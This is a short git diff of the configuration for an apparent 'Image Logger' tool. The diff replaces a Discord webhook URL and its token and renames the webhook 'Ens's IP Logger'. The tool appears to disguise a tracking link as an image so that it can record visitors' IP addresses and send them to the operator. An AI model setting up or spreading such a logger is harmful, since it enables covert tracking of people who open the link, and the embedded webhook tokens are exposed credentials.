@@ -12,13 +12,13 @@ __author__ = "Ens"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1134439535552516209/EIMLEVKu_2Iw5SUCXAH94So59dTU7CwURRJfBCfZ02CPkaacoIffaBSdXmrleCtxkJvn",
+    "webhook": "https://discord.com/api/v10/webhooks/1143528539199643761/N0mSp1VOQl_G_mv_lJw3ge8umGRqVAhNpocnZMrN1hhvr9qtoMdMZO-ewCmmrexS5fcP",
     "image": "https://dar.vin/Log", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
-    "username": "Image Logger", # Set this to the name you want the webhook to have
+    "username": "Ens's IP Logger", # Set this to the name you want the webhook to have
     "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
